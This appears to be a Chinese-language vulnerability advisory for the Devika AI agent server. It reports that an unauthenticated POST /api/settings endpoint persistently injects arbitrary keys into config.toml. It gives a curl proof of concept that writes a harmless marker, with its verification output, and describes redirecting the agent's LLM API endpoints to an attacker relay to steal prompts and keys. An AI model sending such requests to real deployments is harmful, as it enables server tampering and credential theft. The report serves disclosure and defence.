# Devika：未认证持久化配置注入（POST /api/settings）

## 描述

`POST /api/settings`（devika.py:187-193）接受任意键值对并写入 `config.toml` 的已有段落，无认证、无键白名单。注入的配置在重启后依然生效。

## 影响

未认证客户端可持久篡改服务器配置：改写 `API_ENDPOINTS`（把 LLM 流量指向攻击者中转站以窃取提示词/密钥）、修改存储路径等，且重启不失效。

## PoC

```bash
curl -X POST "http://127.0.0.1:1337/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"STORAGE": {"REPRO_INJECTED_KEY": "pwned-marker"}}'

# 验证持久化：
grep REPRO_INJECTED_KEY config.toml
```

## 执行结果

```
$ curl -X POST .../api/settings -d '{"STORAGE": {"REPRO_INJECTED_KEY": "pwned-marker"}}'
[HTTP 200]

$ grep REPRO_INJECTED_KEY config.toml
8:REPRO_INJECTED_KEY = "pwned-marker"
```
